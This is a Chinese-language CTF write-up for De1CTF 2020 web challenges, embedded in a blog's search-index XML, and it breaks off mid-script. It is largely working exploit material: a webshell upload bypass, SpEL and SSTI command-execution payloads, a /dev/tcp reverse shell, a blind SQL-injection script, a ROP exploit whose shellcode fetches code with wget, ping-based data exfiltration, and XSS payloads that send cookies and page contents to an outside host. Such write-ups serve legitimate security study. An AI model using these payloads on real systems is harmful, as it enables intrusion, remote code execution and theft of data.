<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020 De1CTF Web</title>
    <url>/2020/05/13/2020-De1CTF-Web/</url>
    <content><![CDATA[<p>de1ta 师傅出的题质量真的太高了，膜拜一下</p>
<span id="more"></span>

<h2 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h2><p>文件上传题目</p>
<p>先上传 .htaccess，php 字段使用反斜杠绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-p\</span><br><span class="line">hp .png</span><br></pre></td></tr></table></figure>

<p>然后上传后缀为 .png 的一句话木马访问即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?= system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>



<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>java 计算器题目</p>
<blockquote>
<p>这题是环境坏了捡了个漏</p>
</blockquote>
<p>抓包修改 <code>clac</code>，添加一些图书字符使其报错，发现是 springboot 框架</p>
<p>可以知道是 SpEL 表达式注入</p>
<p>fuzz 之后过滤了以下关键字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">- T\s*\(</span><br><span class="line">- \#</span><br><span class="line">- new</span><br><span class="line">- java\.lang</span><br><span class="line">- Runtime</span><br><span class="line">- exec.*\(</span><br><span class="line">- getRuntime</span><br><span class="line">- ProcessBuilder</span><br><span class="line">- start</span><br><span class="line">- getClass</span><br><span class="line">- String</span><br></pre></td></tr></table></figure>

<p>payload 可以结合 java  的反射机制和字符串拼接可以绕过黑名单</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.class.forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getDeclaredMethods()[15].invoke\</span><br><span class="line">(&quot;&quot;.class.forName(&quot;java.l&quot;+&quot;ang.Ru&quot;+&quot;ntime&quot;).getDeclaredMethods()[7].invoke(null),&quot;whoami&quot;)</span><br></pre></td></tr></table></figure>

<p>但是可以执行命令之后发现还有一个 openrasp 的 waf</p>
<p>当时没什么头绪，但是发现下午的时候它的 openrasp 崩了 ：）</p>
<p>于是就可以执行命令了，参考下面文章在 java 反弹 shell 然后 cat &#x2F;flag 就好了</p>
<p><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/">https://blog.spoock.com/2018/11/25/getshell-bypass-exec/</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/bin/bash -c bash$&#123;IFS&#125;-i$&#123;IFS&#125;&gt;&amp;/dev/tcp/xxx.xxx.xxx.xxx/9999&lt;&amp;1</span><br></pre></td></tr></table></figure>

<p>复现的时候才知道，有 waf 的情况下可以直接读文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;&quot;.class.forName(&quot;java.nio.ByteBuffer&quot;).wrap(&quot;&quot;.class.forName(&quot;java.nio.file.Files&quot;).readAllBytes(&quot;&quot;.class.forName(&quot;java.nio.file.Paths&quot;).get(&quot;/flag&quot;))).get(&#123;&#125;)</span><br></pre></td></tr></table></figure>



<h2 id="mixture"><a href="#mixture" class="headerlink" title="mixture"></a>mixture</h2><p>limit 注入 + .so 拓展逆向题目</p>
<h3 id="limit-注入"><a href="#limit-注入" class="headerlink" title="limit 注入"></a>limit 注入</h3><p>打开 member.php 有一个 orderby 提示</p>
<p><img src="https://i.loli.net/2020/05/11/O9s7LmWvQ5ilr4J.png" alt="image-20200511105951203.png"></p>
<p>fuzz 了很久页面还是毫无变化，黑名单是以下关键字</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-  if</span><br><span class="line">- regexp</span><br><span class="line">- sleep</span><br><span class="line">- union</span><br><span class="line">- desc</span><br><span class="line">- rand</span><br><span class="line">- extractvalue</span><br><span class="line">- updatexml </span><br><span class="line">- ^</span><br><span class="line">- ||</span><br><span class="line">- &amp;&amp;</span><br></pre></td></tr></table></figure>

<p>过了很久才测出下面 payload 页面有变化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">member.php?orderby=limit%201</span><br></pre></td></tr></table></figure>

<p>这题就和 2019GoogleCTF 的 gLotto 差不多</p>
<p><a href="https://xz.aliyun.com/t/5503#toc-1">https://xz.aliyun.com/t/5503#toc-1</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">orderby=is+not+null,+(case+when+(ascii(mid(database(),1,1))=116)+then+(select+benchmark(5000000,sha(1))+from+users+limit+1)+else+null+end)</span><br></pre></td></tr></table></figure>

<p>利用脚本进行盲注得到密码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&quot;http://49.51.251.99/&quot;</span></span><br><span class="line">sess = req.Session()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    sess.get(url)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;password&quot;</span>: <span class="string">&quot;admin1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;submit&quot;</span>: <span class="string">&quot;submit&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>index.php&quot;</span>, data=data)</span><br><span class="line">    <span class="comment"># print(sess.get(f&quot;&#123;url&#125;member.php&quot;).text)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sqli</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    index = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line"></span><br><span class="line">        l = <span class="number">0</span></span><br><span class="line">        r = <span class="number">127</span></span><br><span class="line">        m = (l+r)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> l&lt;r:</span><br><span class="line">            paramsGet = &#123;<span class="string">&quot;orderby&quot;</span>:<span class="string">&quot;is not null, (case when (ascii(mid(((select password from member where id=1)),&#123;&#125;,1))&gt;&#123;&#125;) then (select benchmark(1000000,sha(1)) from users limit 1) else null end)&quot;</span>.<span class="built_in">format</span>(index, m)&#125;</span><br><span class="line">            <span class="comment"># first req to get cache</span></span><br><span class="line">            res = sess.get(<span class="string">&quot;http://49.51.251.99/member.php&quot;</span>, params=paramsGet)</span><br><span class="line">            <span class="comment"># print(paramsGet)</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="comment"># time blind sqli</span></span><br><span class="line">                res = sess.get(<span class="string">&quot;http://49.51.251.99/member.php&quot;</span>, params=paramsGet, timeout=<span class="number">1</span>)</span><br><span class="line">                r = m</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                l = m + <span class="number">1</span></span><br><span class="line">            <span class="keyword">finally</span>:</span><br><span class="line">                m = (l+r)//<span class="number">2</span></span><br><span class="line">        flag += <span class="built_in">chr</span>(m)</span><br><span class="line">        index += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*]flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    login()</span><br><span class="line">    sqli()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/11/QEqgo65FJKrpjRe.png" alt="image-20200511110704496.png"></p>
<h3 id="so-拓展逆向"><a href="#so-拓展逆向" class="headerlink" title=".so 拓展逆向"></a>.so 拓展逆向</h3><p>进去之后是一个读文件接口和 phpinfo 页面</p>
<p>搜索一到一个 <code>Minclude</code> 扩展，然后根据拓展地址下载下来</p>
<p><img src="https://i.loli.net/2020/05/11/Nk3yDbRYH7xSrmc.png" alt="image-20200511110831912.png"></p>
<p>后面就交给 @q4n 爷爷去 rop 了，附上队友的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sess = requests.Session()</span><br><span class="line">url = <span class="string">&quot;http://49.51.251.99/&quot;</span></span><br><span class="line"><span class="comment"># auto renew session</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote_login</span>():</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;goodlucktoyou&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;submit&#x27;</span>: <span class="string">&quot;submit&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    sess.post(url, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># connect remote</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remote1</span>(<span class="params">filename</span>):</span><br><span class="line">    remote_login()</span><br><span class="line">    data = &#123;<span class="string">&quot;submit&quot;</span>:<span class="string">&quot;submit&quot;</span>,<span class="string">&quot;search&quot;</span>:filename&#125;</span><br><span class="line">    response = sess.post(url + <span class="string">&quot;select.php&quot;</span>, data=data).content</span><br><span class="line">    <span class="comment"># index = response.rfind(&quot;&lt;br&gt;&quot;.encode())</span></span><br><span class="line">    text = response</span><br><span class="line">    <span class="built_in">print</span>(text)</span><br><span class="line">    <span class="comment"># download(filename, text)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># download file</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">filename, text</span>):</span><br><span class="line">    filename = filename[filename.rfind(<span class="string">&quot;/&quot;</span>) + <span class="number">1</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] write %s&quot;</span> %(filename))</span><br><span class="line">    f = <span class="built_in">open</span>(filename, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line">    f.write(text)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># test in local docker</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">local</span>(<span class="params">filename</span>):</span><br><span class="line">    url = <span class="string">&quot;http://ip:8085/&quot;</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;search&quot;</span>: filename</span><br><span class="line">    &#125;</span><br><span class="line">    resp = requests.post(url, data=data).content</span><br><span class="line">    <span class="built_in">print</span>(resp)</span><br><span class="line">    <span class="comment"># return resp</span></span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line">stack = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genpayload</span>():</span><br><span class="line">    <span class="keyword">global</span> DEB</span><br><span class="line">    <span class="comment"># srv</span></span><br><span class="line">    <span class="keyword">if</span> DEB:</span><br><span class="line">        libc = <span class="number">0x00007f77c0d7c000</span></span><br><span class="line">        stack = <span class="number">0x00007ffc81aa4000</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc = <span class="number">0x7f2fb414d000</span></span><br><span class="line">        stack = <span class="number">0x7ffc338fa000</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    system = <span class="number">0x00449C0</span>+libc</span><br><span class="line">    pdi=<span class="number">0x0000000000023a5f</span>+libc</span><br><span class="line">    psi=<span class="number">0x000000000002440e</span>+libc</span><br><span class="line">    pdx=<span class="number">0x0000000000106725</span>+libc</span><br><span class="line">    pcx=<span class="number">0x00000000000e898e</span>+libc</span><br><span class="line">    pbx=<span class="number">0x000000000002d0d9</span>+libc</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(pbx))</span><br><span class="line">    xa=<span class="number">0x0000000000098385</span>+libc</span><br><span class="line">    one = libc+<span class="number">0x4484f</span></span><br><span class="line">    mprotect = libc+<span class="number">0x0F4200</span></span><br><span class="line">    ret = <span class="number">0x000000000002235f</span>+libc</span><br><span class="line">    <span class="comment"># 0x0000000000106724 : pop r10 ; ret</span></span><br><span class="line">    p10 = <span class="number">0x0000000000106724</span>+libc</span><br><span class="line">    <span class="comment"># 0x00000000000351d4 : add rdi, r10 ; jmp rdi</span></span><br><span class="line">    jdi = <span class="number">0x00000000000351d4</span> + libc</span><br><span class="line">    <span class="comment"># 0x0000000000106723 : pop rdx ; pop r10 ; ret</span></span><br><span class="line">    pdxp=<span class="number">0x0000000000106723</span>+libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 0x000000000003a2b2 : mov rdi, r9 ; call rdx</span></span><br><span class="line">    pr = <span class="number">0x000000000003a2b2</span>+libc</span><br><span class="line">    getsp = <span class="number">0x00000000000a35c6</span>+libc <span class="comment"># : lea ecx, dword ptr [rax + 1] ; lea r9, qword ptr [rsp + 0x28] ; call rbx</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>.ljust(<span class="number">0x88</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#padding</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload += flat(pdi,stack)</span><br><span class="line">    payload += flat(psi,<span class="number">0x21000</span>)</span><br><span class="line">    payload += flat(pdx,<span class="number">7</span>)</span><br><span class="line">    payload += p64(mprotect)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload += flat(pbx,pbx)</span><br><span class="line">    payload += p64(getsp)</span><br><span class="line">    payload += flat(pdxp,jdi)</span><br><span class="line">    payload += p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">    payload += flat(pdxp,jdi)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>) <span class="comment">#r10</span></span><br><span class="line">    payload += p64(pr)</span><br><span class="line">    payload += <span class="string">&#x27;\x90&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">    <span class="comment"># shellcode place</span></span><br><span class="line">    code64=<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">sub rsp,0x200</span></span><br><span class="line"><span class="string">xor rax,rax</span></span><br><span class="line"><span class="string">xor 	rsi,	rsi			</span></span><br><span class="line"><span class="string">push rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call here</span></span><br><span class="line"><span class="string">.string &quot;/bin/sh&quot;</span></span><br><span class="line"><span class="string">.byte 0</span></span><br><span class="line"><span class="string">here:</span></span><br><span class="line"><span class="string">pop rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call here2</span></span><br><span class="line"><span class="string">.string &quot;/tmp/verver&quot;</span></span><br><span class="line"><span class="string">.byte 0</span></span><br><span class="line"><span class="string">here2:</span></span><br><span class="line"><span class="string">pop rdx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call here3</span></span><br><span class="line"><span class="string">.string &quot;/usr/bin/wget&quot;</span></span><br><span class="line"><span class="string">.byte 0</span></span><br><span class="line"><span class="string">here3:</span></span><br><span class="line"><span class="string">pop r8</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call here4</span></span><br><span class="line"><span class="string">.string &quot;http://ip:2333/&quot;</span></span><br><span class="line"><span class="string">.byte 0</span></span><br><span class="line"><span class="string">here4:</span></span><br><span class="line"><span class="string">pop r9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call here6</span></span><br><span class="line"><span class="string">.string &quot;-O&quot;</span></span><br><span class="line"><span class="string">.byte 0</span></span><br><span class="line"><span class="string">here6:</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">call here5</span></span><br><span class="line"><span class="string">.string &quot;/tmp/verver&quot;</span></span><br><span class="line"><span class="string">.byte 0</span></span><br><span class="line"><span class="string">here5:</span></span><br><span class="line"><span class="string">pop rbx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push 0</span></span><br><span class="line"><span class="string">push rdx</span></span><br><span class="line"><span class="string">push rdi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rsi</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">xor rdx,rdx</span></span><br><span class="line"><span class="string">mov al,0x3b</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">cmp rax, 0</span></span><br><span class="line"><span class="string">jnz ex</span></span><br><span class="line"><span class="string">loop:</span></span><br><span class="line"><span class="string">nop</span></span><br><span class="line"><span class="string">jmp loop</span></span><br><span class="line"><span class="string">ex:</span></span><br><span class="line"><span class="string">int 3</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">    payload += asm(code64)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DEB = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> DEB:</span><br><span class="line">        local(genpayload())</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        remote1(genpayload())</span><br></pre></td></tr></table></figure>

<p>反弹 shell 后上去动态 &#x2F;readflag 前抓一下时钟计算就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">trap &#x27;&#x27; 14</span><br></pre></td></tr></table></figure>



<h2 id="Hard-pentest1"><a href="#Hard-pentest1" class="headerlink" title="Hard_pentest1"></a>Hard_pentest1</h2><p>无字母 shell + 渗透题目</p>
<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><p>一开始文件上传，后缀可以用大小写绕过 <code>pHp</code></p>
<p>字符限制可以用 <code>$_</code>自增绕过</p>
<p>附上队友的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = []</span><br><span class="line"><span class="comment"># get a and _</span></span><br><span class="line">prefix =<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">$_=[];</span></span><br><span class="line"><span class="string">$_=@&quot;$_&quot;;</span></span><br><span class="line"><span class="string">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];</span></span><br><span class="line"><span class="string">$___=$_;</span></span><br><span class="line"><span class="string">$__=&#x27;_&#x27;;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.split()</span><br><span class="line">res.extend(prefix)</span><br><span class="line"><span class="comment"># get _GET</span></span><br><span class="line">GET = <span class="string">&quot;GET&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> GET:</span><br><span class="line">    <span class="keyword">for</span> time <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>)):</span><br><span class="line">        res.append(<span class="string">&quot;$_++;&quot;</span>)</span><br><span class="line">    res.append(<span class="string">&quot;$__.=$_;&quot;</span>)</span><br><span class="line">    res.append(<span class="string">&quot;$_=$___;&quot;</span>)</span><br><span class="line"><span class="comment"># ($_GET[_])($_GET[__],$_GET[___]);</span></span><br><span class="line">res.append(<span class="string">&quot;($&#123;$__&#125;[_])($&#123;$__&#125;[__],$&#123;$__&#125;[___]);&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">        f.write(<span class="string">f&quot;&lt;?= <span class="subst">&#123;i.strip()[:-<span class="number">1</span>]&#125;</span> ?&gt;&quot;</span>)</span><br><span class="line">        f.write(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>

<p>然后就可以使用 <code>file_put_contents</code> 进行写马了</p>
<h3 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h3><p>具体用到的是一个组策略 gpp 的漏洞</p>
<blockquote>
<p>主要参考月亮大哥的思路</p>
</blockquote>
<p><code>netstat -ano</code>查看一下网络信息发现有一台<code>192.168.0.12</code>的主机</p>
<p><code>net user /domain</code>查看域发现有一个<code>HintZip_Pass</code>用户</p>
<p><img src="https://i.loli.net/2020/05/11/stGrgkidj2FlZHf.png" alt="image-20200511112144407.png"></p>
<p><code>net user HintZip_Pass /domain</code>继续查看该账户</p>
<p><img src="https://i.loli.net/2020/05/11/D3WNgCV4cXaJLqO.png" alt="image-20200511112304043.png"></p>
<p>查看域控信息</p>
<p><img src="https://i.loli.net/2020/05/11/tdEDUC9jaX6IFnQ.png" alt="image-20200511112406373.png"></p>
<p>挂载查看 <code>Hint</code> 信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use e: \\192.168.0.12\Hint</span><br><span class="line">cd /d e:</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/05/11/8I9bB3m1kaZRcrz.png" alt="image-20200511112525140.png"></p>
<p>发现一个加密压缩包</p>
<p>挂载再查看 <code>SYSVOL</code> 信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use e: \\192.168.0.12\SYSVOL</span><br><span class="line">cd /d e:</span><br></pre></td></tr></table></figure>

<p>使用<code>tree</code>查看目录结构</p>
<p><img src="https://i.loli.net/2020/05/11/HnZM3e1DvR2tP9B.png" alt="image-20200511112734995.png"></p>
<p>这个<code>Groups</code>文件夹, 有GPP漏洞</p>
<p><img src="https://i.loli.net/2020/05/11/iWKsY2InFlRGBN7.png" alt="image-20200511112822374.png"></p>
<p>使用 kali 的 <code>gpp-decrypt</code> 工具解密即可拿到解压密码</p>
<h2 id="mc-logclient"><a href="#mc-logclient" class="headerlink" title="mc_logclient"></a>mc_logclient</h2><p>SSTI 题目</p>
<p>简单说一下题目逻辑就是写文件和读文件前都需要校验 <code>work</code> 这个是可以简单爆破的，先读文件才能进行写文件（这个不重要），读文件可以出发 SSTI 漏洞</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_work</span>(<span class="params">text, result</span>):</span><br><span class="line">    chrset = string.ascii_letters + string.digits</span><br><span class="line">    <span class="keyword">for</span> c1 <span class="keyword">in</span> chrset:</span><br><span class="line">        <span class="keyword">for</span> c2 <span class="keyword">in</span> chrset:</span><br><span class="line">            <span class="keyword">for</span> c3 <span class="keyword">in</span> chrset:</span><br><span class="line">                <span class="keyword">for</span> c4 <span class="keyword">in</span> chrset:</span><br><span class="line">                    s4 = c1 + c2 + c3 + c4</span><br><span class="line">                    tmp_result = hashlib.sha256((text + s4).encode()).hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> tmp_result == result:</span><br><span class="line">                        <span class="built_in">print</span>(<span class="string">f&quot;[*] right work: <span class="subst">&#123;s4&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span> s4</span><br></pre></td></tr></table></figure>

<p>SSTI 的黑名单如下，问题不大，可以用 request 绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Some bad words.</span><br><span class="line">blacklist = [&#x27;+&#x27;, &#x27;,&#x27;, &#x27;:&#x27;, &#x27;\&#x27;\&#x27;&#x27;, &#x27;&quot;&quot;&#x27;, &#x27;%&#x27;, &#x27;lower&#x27;, &#x27;upper&#x27;, &#x27;builtin&#x27;, &#x27;fork&#x27;, &#x27;exec&#x27;, &#x27;walk&#x27;, &#x27;open&#x27;, &#x27;spawn&#x27;, &#x27;reload&#x27;, &#x27;exit&#x27;, &#x27;bin&#x27;, &#x27;sh&#x27;, &#x27;cat&#x27;, &#x27;config&#x27;, &#x27;secret&#x27;, &#x27;key&#x27;, &#x27;flag&#x27;]</span><br><span class="line"></span><br><span class="line"># Posix is a bad module, filter it all.</span><br><span class="line">for i in dir(posix):</span><br><span class="line">    blacklist.append(i.lower())</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里过滤的是 ‘’ 而不是 ‘ 当时被坑了</p>
</blockquote>
<p>给出一个简单的 payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#x27;system&#x27;](request.args.b)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>虽然是可以命令执行了，但是当时什么外带命令都打不出来，赛后发现是可以用 ping 进行外带数据</p>
<p>客户端执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ping -c 1 -p `/readflag` [your vps]</span><br></pre></td></tr></table></figure>

<p>vps 执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcpdump -c 2 -q -XX -vvv -nn -i eth0 icmp</span><br></pre></td></tr></table></figure>

<p>就可以监听到 flag 数据了，但是 icmp 包最大只能接收84长度的数据包，所有要打多几次</p>
<p>官方 wp 利用新特性 <code>breakpointhook </code> 的方法</p>
<p><a href="https://github.com/impakho/de1ctf-mc_challs/tree/master/writeup/mc_logclient">https://github.com/impakho/de1ctf-mc_challs/tree/master/writeup/mc_logclient</a></p>
<h2 id="Animal-Crossing"><a href="#Animal-Crossing" class="headerlink" title="Animal Crossing"></a>Animal Crossing</h2><p>XSS 题目</p>
<p>一进来是个好看的动森界面</p>
<p><img src="https://i.loli.net/2020/05/11/rFSQIdENuq4mRoa.png" alt="image.png"></p>
<p>经过 fuzz 可以发现 name、fruit 和 username 处有转义，title 处有 waf，显然注入点就在 title，但是直接加了单引号被 waf 了，而且 \x 编码绕不过就迷茫了，后来才发现不是单引号被 waf 了，是报错被 waf 了 ：）</p>
<p>title 可以直接单引号注释逃逸</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">titile=1&#x27;//</span><br></pre></td></tr></table></figure>

<p>看看 CSP，支持内联标签</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;unsafe-eval&#x27;;object-src &#x27;none&#x27;;</span><br></pre></td></tr></table></figure>

<p>黑名单绕过就使用 base64 编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;+open(atob(&#x27;payload&#x27;))</span><br></pre></td></tr></table></figure>

<p>以下 payload 可以弹回 cookie，cookie 弹回来就是前一半的 flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function test()&#123;window.location=&quot;http://ip:9999/?f=&quot;+btoa(document.cookie);&#125;()));//</span><br></pre></td></tr></table></figure>

<p>然后读一下网页源码可以看到有 400 张图片</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(function test()&#123;window.location=&quot;http://ip:9999/?f=&quot;+btoa(document.body.innerHTML);&#125;()));//</span><br></pre></td></tr></table></figure>

<p>利用 upload 接口把照片带到外面</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(async()=&gt;&#123;</span><br><span class="line">    const arr = []</span><br><span class="line">    for(let i=1;i&lt;=400;i++) &#123;</span><br><span class="line">    res = await fetch(`/island/test_$&#123;String(i).padStart(2,0)&#125;.png`)</span><br><span class="line">    data = await res.blob()</span><br><span class="line">    const os = new FormData();</span><br><span class="line">    const mf = new File([data], &quot;name.png&quot;);</span><br><span class="line">    os.append(&quot;file&quot;, mf);</span><br><span class="line">    r = await fetch(&quot;/upload&quot;, &#123;method: &quot;POST&quot;,body: os&#125;)</span><br><span class="line">    data = await r.json()</span><br><span class="line">    arr.push(data.data)</span><br><span class="line">    &#125;</span><br><span class="line">    location=&quot;http://xxx.xxx.xxx.xxx:9999/?f=&quot;+btoa(JSON.stringify(arr))</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>下载图片然后拼图得到后半部分的 flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">width_len, height_len, result</span>):</span><br><span class="line"></span><br><span class="line">	img = Image.<span class="built_in">open</span>(<span class="string">&quot;img//01.png&quot;</span>)</span><br><span class="line">	size = img.size</span><br><span class="line">	width, height = size[<span class="number">0</span>], size[<span class="number">1</span>]</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&quot;width: <span class="subst">&#123;width&#125;</span>, height: <span class="subst">&#123;height&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">	width_len, height_len = <span class="built_in">int</span>(width_len), <span class="built_in">int</span>(height_len)</span><br><span class="line">	width_length, height_length = width_len, height_len</span><br><span class="line">	sum_width, sum_height = width * width_length, height * height_length</span><br><span class="line"></span><br><span class="line">	joint = Image.new(<span class="string">&#x27;RGB&#x27;</span>, (sum_width, sum_height))</span><br><span class="line">	index = <span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> row <span class="keyword">in</span> <span class="built_in">range</span>(height_length):</span><br><span class="line">		<span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(width_length):</span><br><span 